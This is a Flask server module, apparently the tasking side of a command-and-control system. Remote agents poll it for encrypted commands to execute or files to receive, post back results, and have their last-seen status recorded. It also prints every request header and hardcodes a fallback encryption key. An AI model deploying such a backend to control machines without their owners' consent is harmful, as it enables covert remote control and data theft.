from flask import Blueprint, request, jsonify
import sqlite3
from datetime import datetime
import base64
import os
from utils import encrypt_data, decrypt_data, get_aes_key  # از utils

client_bp = Blueprint('client', __name__, url_prefix='/api/client')

@client_bp.route('/get-command', methods=['GET'])
def get_last_pending_command():
    print("[DEBUG] All received headers:")
    for name, value in request.headers:
        print(f"  {name}: {value}")
    print(f"[DEBUG] X-Client-ID specifically: '{request.headers.get('X-Client-ID')}'")
    try:
        client_id = request.headers.get("X-Client-ID")
        if not client_id:
            fallback = "0123456789abcdef0123456789abcdef"
            return jsonify({"data": encrypt_data({"message": "X-Client-ID missing"}, fallback)}), 400

        aes_key = get_aes_key(client_id)
        if not aes_key:
            fallback = "0123456789abcdef0123456789abcdef"
            return jsonify({"data": encrypt_data({"message": "invalid client"}, fallback)}), 400

        conn = sqlite3.connect("db.sqlite")
        cursor = conn.cursor()

        
        cursor.execute("UPDATE agents SET last_seen = ?, status = 'active' WHERE uuid = ?", 
                       (datetime.utcnow().isoformat(), client_id))

        
        cursor.execute("""
            SELECT c.id, c.command_text, c.arguments, c.command_type, c.file_path
            FROM Commands c
            JOIN AgentCommands ac ON c.id = ac.command_id
            JOIN agents a ON ac.agent_id = a.id
            WHERE a.uuid = ? AND c.status = 'pending'
            ORDER BY c.created_at DESC
            LIMIT 1
        """, (client_id,))
        
        command = cursor.fetchone()

        if command:
            cmd_id, cmd_text, args, cmd_type, file_path = command

            if cmd_type == "download":
                
                full_path = os.path.abspath(file_path)
                if os.path.exists(full_path) and os.path.isfile(full_path):
                    with open(full_path, 'rb') as f:
                        file_data = base64.b64encode(f.read()).decode('utf-8')
                    response = {
                        "command_id": cmd_id,
                        "command_type": "download",
                        "filename": os.path.basename(full_path),
                        "data": file_data,
                        "size": os.path.getsize(full_path),
                        "message": "file downloaded"
                    }
                    
                    cursor.execute("UPDATE Commands SET status = 'completed' WHERE id = ?", (cmd_id,))
                else:
                    response = {"command_id": cmd_id, "message": "file not found"}
            else:
                
                response = {
                    "command_id": cmd_id,
                    "command": cmd_text or "",
                    "command_type": cmd_type or "execute",
                    "arguments": args or "",
                    "path": file_path or ""
                }

        else:
            response = {"message": "no pending command"}

        conn.commit()
        conn.close()

        encrypted = encrypt_data(response, aes_key)
        return jsonify({"data": encrypted}), 200

    except Exception as e:
        print(f"[get-command error] {e}")
        fallback = "0123456789abcdef0123456789abcdef"
        return jsonify({"data": encrypt_data({"message": "server error"}, fallback)}), 500

@client_bp.route('/results', methods=['POST'])
def create_result():
    try:
        client_id = request.headers.get("X-Client-ID")
        if not client_id:
            fallback = "0123456789abcdef0123456789abcdef"
            return jsonify({"data": encrypt_data({"message": "X-Client-ID missing"}, fallback)}), 400

        aes_key = get_aes_key(client_id)
        if not aes_key:
            fallback = "0123456789abcdef0123456789abcdef"
            return jsonify({"data": encrypt_data({"message": "invalid client"}, fallback)}), 400

        encrypted_data = request.json.get("data")
        payload = decrypt_data(encrypted_data, aes_key)

        command_id = payload.get("command_id")
        result_text = payload.get("result", "")
        success = payload.get("success", True)

        conn = sqlite3.connect("db.sqlite")
        cursor = conn.cursor()

       
        cursor.execute("INSERT INTO Results (command_id, result_data, created_at) VALUES (?, ?, ?)",
                       (command_id, result_text, datetime.utcnow().isoformat()))

        
        new_status = "completed" if success else "failed"
        cursor.execute("UPDATE Commands SET status = ? WHERE id = ?", (new_status, command_id))

        conn.commit()
        conn.close()

        return jsonify({"data": encrypt_data({"status": "success"}, aes_key)}), 200

    except Exception as e:
        print(f"[results error] {e}")
        fallback = "0123456789abcdef0123456789abcdef"
        return jsonify({"data": encrypt_data({"message": str(e)}, fallback)}), 500